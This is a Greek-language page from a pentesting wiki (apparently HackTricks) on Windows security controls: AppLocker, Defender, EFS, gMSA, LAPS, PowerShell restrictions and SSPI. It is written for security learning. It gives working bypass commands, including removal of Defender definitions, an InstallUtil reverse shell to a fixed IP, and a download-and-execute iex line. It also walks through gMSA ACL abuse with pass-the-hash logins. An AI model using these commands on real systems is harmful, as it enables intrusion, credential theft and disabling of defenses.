# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Μια application whitelist είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρησιακές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **application whitelisting solution** της Microsoft και παρέχει στους system administrators έλεγχο σχετικά με το **ποιες εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **granular control** για εκτελέσιμα αρχεία, scripts, Windows installer files, DLLs, packaged apps και packed app installers.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, **αλλά αυτό μπορεί να παρακαμφθεί**.

### Check

Ελέγξτε ποια αρχεία/extensions βρίσκονται σε blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο ελέγχου του τρέχοντος συνόλου κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **φάκελοι με δυνατότητα εγγραφής** για παράκαμψη της πολιτικής του AppLocker: Αν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στα `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **φάκελοι με δυνατότητα εγγραφής** που μπορείτε να χρησιμοποιήσετε για να **το παρακάμψετε**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Τα συνήθως **έμπιστα** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries μπορούν επίσης να φανούν χρήσιμα για την παράκαμψη του AppLocker.
- Οι **κακογραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
- Οι οργανισμοί συχνά εστιάζουν επίσης στο **blocking του executable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- Το **DLL enforcement** ενεργοποιείται πολύ σπάνια λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα και του όγκου testing που απαιτείται για να διασφαλιστεί ότι τίποτα δεν θα σταματήσει να λειτουργεί. Επομένως, η χρήση **DLLs ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε** κώδικα **Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Αποθήκευση Credentials

### Security Accounts Manager (SAM)

Τα local credentials υπάρχουν σε αυτό το αρχείο και τα passwords είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **credentials** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του subsystem για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **security policy** (password policy, permissions χρηστών...), το **authentication**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα credentials που παρέχονται μέσα στο αρχείο **SAM** (για local login) και θα **επικοινωνήσει** με τον **domain controller** για να κάνει authenticate έναν domain user.

Τα **credentials** **αποθηκεύονται** μέσα στη **διεργασία LSASS**: Kerberos tickets, NT και LM hashes, passwords που αποκρυπτογραφούνται εύκολα.

### LSA secrets

Το LSA μπορεί να αποθηκεύσει ορισμένα credentials στον δίσκο:

- Το password του computer account του Active Directory (μη προσβάσιμος domain controller).
- Τα passwords των accounts των Windows services
- Τα passwords για scheduled tasks
- Περισσότερα (password των IIS applications...)

### NTDS.dit

Είναι η database του Active Directory. Υπάρχει μόνο στους Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που διατίθεται στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** συνηθισμένα pentesting tools, όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι protections**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να γνωρίζετε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το κάνετε enumerate, μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

Το EFS προστατεύει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **symmetric key** γνωστό ως **File Encryption Key (FEK)**. Αυτό το key κρυπτογραφείται με το **public key** του χρήστη και αποθηκεύεται μέσα στο **alternative data stream** $EFS του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, το αντίστοιχο **private key** του digital certificate του χρήστη χρησιμοποιείται για την αποκρυπτογράφηση του FEK από το stream $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς ενέργεια από τον χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε non-EFS file system, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το SMB/CIFS protocol αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **transparent access** στα κρυπτογραφημένα αρχεία για τον owner. Ωστόσο, η απλή αλλαγή του password του owner και το login δεν θα επιτρέψουν την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα symmetric FEK, κρυπτογραφημένο με το public key του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το private key του χρήστη για την πρόσβαση στο FEK.
- Αυτόματη αποκρυπτογράφηση πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα στον owner χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **user** έχει **χρησιμοποιήσει** αυτό το **service**, ελέγχοντας αν υπάρχει αυτό το path:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **access** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε τα `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Ως Authority System

Αυτή η μέθοδος απαιτεί ο **victim user** να **εκτελεί** μια **process** μέσα στο host. Αν ισχύει αυτό, χρησιμοποιώντας ένα `meterpreter` session μπορείτε να κάνετε impersonate το token της process του χρήστη (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε απλώς να κάνετε `migrate` στη process του χρήστη.

#### Γνωρίζοντας το password του χρήστη

Το Mimikatz τεκμηριώνει τον τρόπο εισαγωγής του certificate/private key material του χρήστη και αποκρυπτογράφησης αρχείων που προστατεύονται από EFS, όταν είναι γνωστό το password.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των service accounts σε IT infrastructures. Σε αντίθεση με τα παραδοσιακά service accounts, στα οποία συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Automatic Password Management**: Τα gMSA χρησιμοποιούν ένα σύνθετο password 240 χαρακτήρων, το οποίο αλλάζει αυτόματα σύμφωνα με την policy του domain ή του computer. Αυτή η διαδικασία διαχειρίζεται από το Microsoft's Key Distribution Service (KDC), εξαλείφοντας την ανάγκη για manual password updates.
- **Enhanced Security**: Αυτά τα accounts δεν επηρεάζονται από lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSA μπορούν να χρησιμοποιηθούν από multiple hosts, γεγονός που τα καθιστά ιδανικά για services που εκτελούνται σε multiple servers.
- **Scheduled Task Capability**: Σε αντίθεση με τα managed service accounts, τα gMSA υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το system ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount details ή στο DNS name του computer, απλοποιώντας τη διαχείριση του SPN.

Τα passwords των gMSA αποθηκεύονται στην LDAP property _**msDS-ManagedPassword**_ και γίνονται αυτόματα reset κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτό το password, ένα encrypted data blob γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους administrators και τους servers στους οποίους είναι εγκατεστημένα τα gMSA, διασφαλίζοντας ένα secure environment. Για την πρόσβαση σε αυτές τις πληροφορίες απαιτείται secured connection, όπως το LDAPS, ή η connection πρέπει να είναι authenticated με 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Μπορείτε να διαβάσετε αυτό το password με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες στην αρχειοθετημένη αρχική έρευνα**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Η ίδια έρευνα εξηγεί πώς μια **NTLM relay attack** μπορεί να αποκτήσει έναν **κωδικό πρόσβασης gMSA** όταν το principal που γίνεται relay έχει εξουσιοδότηση να διαβάσει το `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Κατάχρηση ACL chaining για την ανάγνωση του managed password ενός gMSA (GenericAll -> ReadGMSAPassword)

Σε πολλά περιβάλλοντα, low-privileged users μπορούν να αποκτήσουν πρόσβαση σε gMSA secrets χωρίς compromise του DC, εκμεταλλευόμενοι λανθασμένα ρυθμισμένα object ACLs:<sup>[[3]](#references)</sup>

- Σε ένα group που μπορείτε να ελέγξετε (π.χ. μέσω GenericAll/GenericWrite) εκχωρείται `ReadGMSAPassword` σε ένα gMSA.
- Προσθέτοντας τον εαυτό σας σε αυτό το group, κληρονομείτε το δικαίωμα ανάγνωσης του `msDS-ManagedPassword` blob του gMSA μέσω LDAP και μπορείτε να παράγετε αξιοποιήσιμα NTLM credentials.

Τυπική ροή εργασίας:

1) Εντοπίστε το path με το BloodHound και επισημάνετε τα principals του foothold σας ως Owned. Αναζητήστε edges όπως:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Προσθέστε τον εαυτό σας στο intermediate group που ελέγχετε (παράδειγμα με bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Διαβάστε τον managed κωδικό πρόσβασης του gMSA μέσω LDAP και παράγετε το NTLM hash. Το NetExec αυτοματοποιεί την εξαγωγή του `msDS-ManagedPassword` και τη μετατροπή του σε NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Κάντε authentication ως το gMSA χρησιμοποιώντας το NTLM hash (δεν απαιτείται plaintext). Εάν ο λογαριασμός ανήκει στο Remote Management Users, το WinRM θα λειτουργήσει απευθείας:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Σημειώσεις:
- Οι αναγνώσεις LDAP του `msDS-ManagedPassword` απαιτούν sealing (π.χ. LDAPS/sign+seal). Τα tools το χειρίζονται αυτόματα.
- Στα gMSAs εκχωρούνται συχνά τοπικά δικαιώματα όπως WinRM. Επικυρώστε τη συμμετοχή σε groups (π.χ. Remote Management Users) για να σχεδιάσετε lateral movement.
- Αν χρειάζεστε μόνο το blob για να υπολογίσετε μόνοι σας το NTLM, δείτε τη δομή MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Η **Local Administrator Password Solution (LAPS)**, η οποία είναι διαθέσιμη για λήψη από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης του local Administrator. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαιοποιημένοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκή εκχωρημένα δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης του local admin.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως τον αποκλεισμό COM objects, την αποκλειστική अनुमति εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, PowerShell classes και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Στις τρέχουσες εκδόσεις των Windows, αυτό το bypass δεν λειτουργεί πλέον, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, ενδέχεται να χρειαστεί** **να** _**Προσθέσετε μια αναφορά**_ -> _Περιήγηση_ ->_Περιήγηση_ -> προσθέστε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το project σε .Net4.5**.

#### Άμεσο bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το constrained mode. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Από προεπιλογή έχει οριστεί σε **restricted.** Κύριοι τρόποι παράκαμψης αυτής της policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Διεπαφή Παρόχου Υποστήριξης Ασφάλειας (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την authentication χρηστών.

Το SSPI επιλέγει ένα κατάλληλο authentication protocol για δύο machines που επικοινωνούν, προτιμώντας το Kerberos όταν είναι διαθέσιμο. Αυτά τα protocols υλοποιούνται από Security Support Providers (SSPs), οι οποίοι εγκαθίστανται ως DLLs στα Windows· και οι δύο peers πρέπει να υποστηρίζουν τον provider που αποτέλεσε αντικείμενο διαπραγμάτευσης.

### Κύριοι SSPs

- **Kerberos**: Ο προτιμώμενος
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, password σε μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του protocol που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει several methods ή μόνο ένα.

## UAC - Έλεγχος Λογαριασμού Χρήστη

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι ένα feature που ενεργοποιεί ένα **consent prompt για elevated activities**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Αναμετάδοση για gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA μέσω chaining δικαιωμάτων στο WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Παράκαμψη του AppLocker και του PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 τρόποι παράκαμψης του PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [οδηγός ~ αποκρυπτογράφηση αρχείων EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
